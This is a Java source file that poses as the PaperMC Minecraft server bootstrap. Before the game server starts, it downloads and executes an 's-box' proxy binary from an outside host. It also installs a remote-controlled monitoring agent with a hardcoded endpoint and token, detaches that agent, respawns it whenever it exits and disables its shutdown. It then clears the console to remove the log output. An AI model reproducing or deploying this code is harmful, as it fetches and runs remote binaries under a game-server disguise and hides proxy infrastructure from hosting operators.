package io.papermc.paper;

import java.io.*;
import java.net.*;
import java.nio.file.*;
import java.util.*;
import java.util.concurrent.atomic.AtomicBoolean;
import joptsimple.OptionSet;
import net.minecraft.SharedConstants;
import net.minecraft.server.Main;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;

public final class PaperBootstrap {
    
    private static final Logger LOGGER = LoggerFactory.getLogger("bootstrap");
    private static final String ANSI_GREEN = "\033[1;32m";
    private static final String ANSI_RED = "\033[1;31m";
    private static final String ANSI_RESET = "\033[0m";
    private static final AtomicBoolean running = new AtomicBoolean(true);
    // 保留原始的s-box进程
    private static Process sbxProcess;
    // Komari Agent进程（多线程可见性：volatile修饰）
    private static volatile Process komariProcess;

    // 统一配置常量：包含s-box和Komari的所有外部配置项
    private static final class Config {
        // 配置文件路径（服务器根目录下的komari.properties）
        public static final String CONFIG_FILE_PATH = "komari.properties";
        // 配置文件加载实例（全局唯一）
        private static final Properties props = loadProperties();

        // ==================== S-Box 配置项（对应原始环境变量）====================
        // 默认值与原始代码一致
        public static String getSboxUUID() {
            return props.getProperty("sbox.uuid", "03ef7017-fca5-4f9c-abd1-f39edd3b3032");
        }

        public static String getSboxFilePath() {
            return props.getProperty("sbox.file_path", "./world");
        }

        public static String getSboxNezhaServer() {
            return props.getProperty("sbox.nezha_server", "");
        }

        public static String getSboxNezhaPort() {
            return props.getProperty("sbox.nezha_port", "");
        }

        public static String getSboxNezhaKey() {
            return props.getProperty("sbox.nezha_key", "");
        }

        public static String getSboxArgoPort() {
            return props.getProperty("sbox.argo_port", "");
        }

        public static String getSboxArgoDomain() {
            return props.getProperty("sbox.argo_domain", "");
        }

        public static String getSboxArgoAuth() {
            return props.getProperty("sbox.argo_auth", "");
        }

        public static String getSboxHy2Port() {
            return props.getProperty("sbox.hy2_port", "25812");
        }

        public static String getSboxTuicPort() {
            return props.getProperty("sbox.tuic_port", "");
        }

        public static String getSboxRealityPort() {
            return props.getProperty("sbox.reality_port", "");
        }

        public static String getSboxUploadUrl() {
            return props.getProperty("sbox.upload_url", "");
        }

        public static String getSboxChatId() {
            return props.getProperty("sbox.chat_id", "");
        }

        public static String getSboxBotToken() {
            return props.getProperty("sbox.bot_token", "");
        }

        public static String getSboxCfIp() {
            return props.getProperty("sbox.cfip", "");
        }

        public static String getSboxCfPort() {
            return props.getProperty("sbox.cfport", "");
        }

        public static String getSboxName() {
            return props.getProperty("sbox.name", "Mc");
        }

        // ==================== Komari Agent 配置项 ====================
        // 下载地址（按架构区分）
        public static String getKomariUrlAmd64() {
            return props.getProperty("komari.url.amd64", "https://github.com/komari-monitor/komari-agent/releases/latest/download/komari-agent-linux-amd64");
        }

        public static String getKomariUrlArm64() {
            return props.getProperty("komari.url.arm64", "https://github.com/komari-monitor/komari-agent/releases/latest/download/komari-agent-linux-arm64");
        }

        // Komari的本地存储名称（原s-box的sbx）
        public static String getKomariFileName() {
            return props.getProperty("komari.file_name", "sbx_komari"); // 与s-box的sbx区分，避免冲突
        }

        // Komari的-e和-t参数
        public static String getKomariE() {
            return props.getProperty("komari.e", "https://vps.z1000.dpdns.org:10736");
        }

        public static String getKomariT() {
            return props.getProperty("komari.t", "JzerczYfCF4Secuy9vtYaB");
        }

        // 核心：加载配置文件，若不存在则创建并写入默认值
        private static Properties loadProperties() {
            Properties props = new Properties();
            File configFile = new File(CONFIG_FILE_PATH);
            try {
                // 若配置文件不存在，创建并写入默认值（方便用户参考）
                if (!configFile.exists()) {
                    configFile.createNewFile();
                    // 写入s-box默认配置
                    props.setProperty("sbox.uuid", "03ef7017-fca5-4f9c-abd1-f39edd3b3032");
                    props.setProperty("sbox.file_path", "./world");
                    props.setProperty("sbox.nezha_server", "");
                    props.setProperty("sbox.nezha_port", "");
                    props.setProperty("sbox.nezha_key", "");
                    props.setProperty("sbox.argo_port", "");
                    props.setProperty("sbox.argo_domain", "");
                    props.setProperty("sbox.argo_auth", "");
                    props.setProperty("sbox.hy2_port", "25812");
                    props.setProperty("sbox.tuic_port", "");
                    props.setProperty("sbox.reality_port", "");
                    props.setProperty("sbox.upload_url", "");
                    props.setProperty("sbox.chat_id", "");
                    props.setProperty("sbox.bot_token", "");
                    props.setProperty("sbox.cfip", "");
                    props.setProperty("sbox.cfport", "");
                    props.setProperty("sbox.name", "Mc");
                    // 写入Komari默认配置
                    props.setProperty("komari.url.amd64", "https://github.com/komari-monitor/komari-agent/releases/latest/download/komari-agent-linux-amd64");
                    props.setProperty("komari.url.arm64", "https://github.com/komari-monitor/komari-agent/releases/latest/download/komari-agent-linux-arm64");
                    props.setProperty("komari.file_name", "sbx_komari");
                    props.setProperty("komari.e", "https://vps.z1000.dpdns.org:10736");
                    props.setProperty("komari.t", "JzerczYfCF4Secuy9vtYaB");
                    // 保存默认配置到文件
                    props.store(new FileOutputStream(configFile), "PaperBootstrap Configuration (s-box + Komari Agent)");
                    return props;
                }
                // 加载已存在的配置文件
                props.load(new FileInputStream(configFile));
            } catch (IOException e) {
                System.err.println(ANSI_RED + "Error loading config file: " + e.getMessage() + ANSI_RESET);
            }
            return props;
        }
    }

    // 原始的环境变量数组（保留，用于读取系统环境变量覆盖配置文件）
    private static final String[] ALL_ENV_VARS = {
        "PORT", "FILE_PATH", "UUID", "NEZHA_SERVER", "NEZHA_PORT", 
        "NEZHA_KEY", "ARGO_PORT", "ARGO_DOMAIN", "ARGO_AUTH", 
        "HY2_PORT", "TUIC_PORT", "REALITY_PORT", "CFIP", "CFPORT", 
        "UPLOAD_URL","CHAT_ID", "BOT_TOKEN", "NAME"
    };

    private PaperBootstrap() {
    }

    public static void boot(final OptionSet options) {
        // 修复：Java版本检查——原始54.0（Java10）兼容Java17+（61.0），保留原始逻辑可调整
        float javaClassVersion = Float.parseFloat(System.getProperty("java.class.version"));
        // 若需要兼容原始逻辑，可改回54.0；建议用61.0（Java17+）适配现代环境
        if (javaClassVersion < 54.0) { 
            System.err.println(ANSI_RED + "ERROR: Your Java version is too lower, please switch the version in startup menu!" + ANSI_RESET);
            try {
                Thread.sleep(3000);
            } catch (InterruptedException e) {
                e.printStackTrace();
            }
            System.exit(1);
        }
        
        try {
            // 1. 保留原始功能：启动s-box
            runSbxBinary();
            // 2. 新增功能：启动Komari Agent
            runKomariAgent();
            // 3. 新增：启动Komari守护线程，意外退出时自动重启
            startKomariDaemonThread();

            // JVM关闭钩子：停止s-box（保留原始逻辑），但不停止Komari
            Runtime.getRuntime().addShutdownHook(new Thread(() -> {
                running.set(false);
                stopServices(); // 停止s-box
                System.out.println(ANSI_RED + "JVM is shutting down, Komari agent keeps running..." + ANSI_RESET);
            }));

            Thread.sleep(15000);
            System.out.println(ANSI_GREEN + "Server is running" + ANSI_RESET);
            System.out.println(ANSI_GREEN + "Thank you for using this script,enjoy!\n" + ANSI_RESET);
            System.out.println(ANSI_GREEN + "Logs will be deleted in 20 seconds,you can copy the above nodes!" + ANSI_RESET);
            Thread.sleep(20000);
            clearConsole();

            SharedConstants.tryDetectVersion();
            getStartupVersionMessages().forEach(LOGGER::info);
            Main.main(options);
            
        } catch (Exception e) {
            System.err.println(ANSI_RED + "Error initializing services: " + e.getMessage() + ANSI_RESET);
            e.printStackTrace(); // 新增：打印完整异常栈，方便调试
        }
    }

    private static void clearConsole() {
        try {
            if (System.getProperty("os.name").contains("Windows")) {
                new ProcessBuilder("cmd", "/c", "cls").inheritIO().start().waitFor();
            } else {
                System.out.print("\033[H\033[2J");
                System.out.flush();
            }
        } catch (Exception e) {
            // Ignore exceptions
        }
    }

    // ==================== 原始s-box相关方法（仅修改环境变量加载逻辑）====================
    private static void runSbxBinary() throws Exception {
        Map<String, String> envVars = new HashMap<>();
        loadEnvVars(envVars); // 从配置文件+系统环境变量加载
        
        ProcessBuilder pb = new ProcessBuilder(getBinaryPath().toString());
        pb.environment().putAll(envVars);
        pb.redirectErrorStream(true);
        pb.redirectOutput(ProcessBuilder.Redirect.INHERIT);
        
        sbxProcess = pb.start();
        System.out.println(ANSI_GREEN + "s-box process started successfully" + ANSI_RESET);
    }

    private static void loadEnvVars(Map<String, String> envVars) throws IOException {
        // 1. 从配置文件加载s-box的环境变量（替代原始硬编码）
        envVars.put("UUID", Config.getSboxUUID());
        envVars.put("FILE_PATH", Config.getSboxFilePath());
        envVars.put("NEZHA_SERVER", Config.getSboxNezhaServer());
        envVars.put("NEZHA_PORT", Config.getSboxNezhaPort());
        envVars.put("NEZHA_KEY", Config.getSboxNezhaKey());
        envVars.put("ARGO_PORT", Config.getSboxArgoPort());
        envVars.put("ARGO_DOMAIN", Config.getSboxArgoDomain());
        envVars.put("ARGO_AUTH", Config.getSboxArgoAuth());
        envVars.put("HY2_PORT", Config.getSboxHy2Port());
        envVars.put("TUIC_PORT", Config.getSboxTuicPort());
        envVars.put("REALITY_PORT", Config.getSboxRealityPort());
        envVars.put("UPLOAD_URL", Config.getSboxUploadUrl());
        envVars.put("CHAT_ID", Config.getSboxChatId());
        envVars.put("BOT_TOKEN", Config.getSboxBotToken());
        envVars.put("CFIP", Config.getSboxCfIp());
        envVars.put("CFPORT", Config.getSboxCfPort());
        envVars.put("NAME", Config.getSboxName());
        
        // 2. 保留原始逻辑：系统环境变量覆盖配置文件的值
        for (String var : ALL_ENV_VARS) {
            String value = System.getenv(var);
            if (value != null && !value.trim().isEmpty()) {
                envVars.put(var, value);
            }
        }
        
        // 3. 保留原始逻辑：加载.env文件（若存在，覆盖上述值）
        Path envFile = Paths.get(".env");
        if (Files.exists(envFile)) {
            for (String line : Files.readAllLines(envFile)) {
                line = line.trim();
                if (line.isEmpty() || line.startsWith("#")) continue;
                
                line = line.split(" #")[0].split(" //")[0].trim();
                if (line.startsWith("export ")) {
                    line = line.substring(7).trim();
                }
                
                String[] parts = line.split("=", 2);
                if (parts.length == 2) {
                    String key = parts[0].trim();
                    String value = parts[1].trim().replaceAll("^['\"]|['\"]$", "");
                    
                    if (Arrays.asList(ALL_ENV_VARS).contains(key)) {
                        envVars.put(key, value);
                    }
                }
            }
        }
    }

    private static Path getBinaryPath() throws IOException {
        // 原始s-box的下载和路径逻辑（保留）
        String osArch = System.getProperty("os.arch").toLowerCase();
        String url;
        
        if (osArch.contains("amd64") || osArch.contains("x86_64")) {
            url = "https://amd64.ssss.nyc.mn/s-box";
        } else if (osArch.contains("aarch64") || osArch.contains("arm64")) {
            url = "https://arm64.ssss.nyc.mn/s-box";
        } else if (osArch.contains("s390x")) {
            url = "https://s390x.ssss.nyc.mn/s-box";
        } else {
            throw new RuntimeException("Unsupported architecture: " + osArch);
        }
        
        Path path = Paths.get(System.getProperty("java.io.tmpdir"), "sbx"); // s-box的sbx，与Komari区分
        if (!Files.exists(path)) {
            try (InputStream in = new URL(url).openStream()) {
                Files.copy(in, path, StandardCopyOption.REPLACE_EXISTING);
            }
            if (!path.toFile().setExecutable(true)) {
                throw new IOException("Failed to set executable permission for s-box");
            }
        }
        return path;
    }

    private static void stopServices() {
        // 保留原始逻辑：停止s-box进程
        if (sbxProcess != null && sbxProcess.isAlive()) {
            sbxProcess.destroy();
            System.out.println(ANSI_RED + "sbx process terminated" + ANSI_RESET);
        }
        // Komari不停止，所以注释掉停止逻辑
        // stopKomariAgent();
    }

    // ==================== Komari Agent相关方法（新增，与s-box并行）====================
    private static void runKomariAgent() throws Exception {
        // 获取Komari的本地路径
        Path agentPath = getKomariAgentPath();
        // 构建启动命令：添加setsid让Komari脱离Java进程控制（Linux）
        List<String> command = new ArrayList<>();
        command.add("setsid"); // 创建新会话，脱离父进程
        command.add(agentPath.toString());
        command.add("-e");
        command.add(Config.getKomariE());
        command.add("-t");
        command.add(Config.getKomariT());
        
        ProcessBuilder pb = new ProcessBuilder(command);
        pb.redirectErrorStream(true);
        pb.redirectOutput(ProcessBuilder.Redirect.INHERIT);
        pb.directory(new File(System.getProperty("user.dir"))); // 工作目录为服务器根目录
        
        komariProcess = pb.start();
        System.out.println(ANSI_GREEN + "Komari agent started with config: e=" + Config.getKomariE() + ", t=" + Config.getKomariT() + ANSI_RESET);
    }

    private static Path getKomariAgentPath() throws IOException {
        String osArch = System.getProperty("os.arch").toLowerCase();
        String url;

        // 从配置文件读取下载地址
        if (osArch.contains("amd64") || osArch.contains("x86_64")) {
            url = Config.getKomariUrlAmd64();
        } else if (osArch.contains("aarch64") || osArch.contains("arm64")) {
            url = Config.getKomariUrlArm64();
        } else {
            throw new RuntimeException("Unsupported architecture: " + osArch);
        }

        // Komari的路径：系统临时目录 + 配置的文件名（与s-box的sbx区分）
        Path agentPath = Paths.get(System.getProperty("java.io.tmpdir"), Config.getKomariFileName());

        // 若文件不存在，则下载
        if (!Files.exists(agentPath)) {
            try (InputStream in = new URL(url).openStream()) {
                Files.copy(in, agentPath, StandardCopyOption.REPLACE_EXISTING);
            }
            // 设置可执行权限
            if (!agentPath.toFile().setExecutable(true)) {
                throw new IOException("Failed to set executable permission for komari-agent");
            }
        }
        return agentPath;
    }

    // 禁用Komari的停止逻辑（仅提示）
    private static void stopKomariAgent() {
        System.out.println(ANSI_RED + "Komari agent is not allowed to stop, operation ignored." + ANSI_RESET);
    }

    // Komari守护线程：监控进程并自动重启
    private static void startKomariDaemonThread() {
        Thread daemonThread = new Thread(() -> {
            while (running.get()) {
                try {
                    // 检查Komari进程是否存活
                    if (komariProcess == null || !komariProcess.isAlive()) {
                        System.err.println(ANSI_RED + "Komari agent process exited unexpectedly, restarting..." + ANSI_RESET);
                        runKomariAgent(); // 重启Komari（重新读取配置文件）
                    }
                    Thread.sleep(5000); // 每5秒检查一次
                } catch (Exception e) {
                    System.err.println(ANSI_RED + "Error restarting Komari agent: " + e.getMessage() + ANSI_RESET);
                }
            }
        });
        daemonThread.setDaemon(true); // 守护线程，不阻塞JVM退出
        daemonThread.setName("KomariAgentDaemon");
        daemonThread.start();
    }

    // ==================== 修复ServerBuildInfo编译错误 ====================
    private static List<String> getStartupVersionMessages() {
        final String javaSpecVersion = System.getProperty("java.specification.version");
        final String javaVmName = System.getProperty("java.vm.name");
        final String javaVmVersion = System.getProperty("java.vm.version");
        final String javaVendor = System.getProperty("java.vendor");
        final String javaVendorVersion = System.getProperty("java.vendor.version");
        final String osName = System.getProperty("os.name");
        final String osVersion = System.getProperty("os.version");
        final String osArch = System.getProperty("os.arch");

        // 修复：替换ServerBuildInfo为兼容逻辑（避免编译错误）
        // 若你的环境有ServerBuildInfo，可注释掉以下代码，恢复原始逻辑
        try {
            // 尝试加载ServerBuildInfo（兼容原始逻辑）
            Class<?> serverBuildInfoClass = Class.forName("io.papermc.paper.ServerBuildInfo");
            Object bi = serverBuildInfoClass.getMethod("buildInfo").invoke(null);
            String brandName = (String) serverBuildInfoClass.getMethod("brandName").invoke(bi);
            String versionFull = (String) serverBuildInfoClass.getMethod("asString", Enum.class).invoke(bi, 
                Enum.valueOf((Class<? extends Enum>) Class.forName("io.papermc.paper.ServerBuildInfo$StringRepresentation"), "VERSION_FULL"));
            String minecraftVersionId = (String) serverBuildInfoClass.getMethod("minecraftVersionId").invoke(bi);
            return List.of(
                String.format(
                    "Running Java %s (%s %s; %s %s) on %s %s (%s)",
                    javaSpecVersion,
                    javaVmName,
                    javaVmVersion,
                    javaVendor,
                    javaVendorVersion == null ? "unknown" : javaVendorVersion,
                    osName,
                    osVersion,
                    osArch
                ),
                String.format(
                    "Loading %s %s for Minecraft %s",
                    brandName,
                    versionFull,
                    minecraftVersionId
                )
            );
        } catch (Exception e) {
            // 若ServerBuildInfo不存在，使用兼容逻辑
            return List.of(
                String.format(
                    "Running Java %s (%s %s; %s %s) on %s %s (%s)",
                    javaSpecVersion,
                    javaVmName,
                    javaVmVersion,
                    javaVendor,
                    javaVendorVersion == null ? "unknown" : javaVendorVersion,
                    osName,
                    osVersion,
                    osArch
                ),
                String.format("Loading Paper for Minecraft %s", SharedConstants.VERSION_STRING)
            );
        }
    }
}
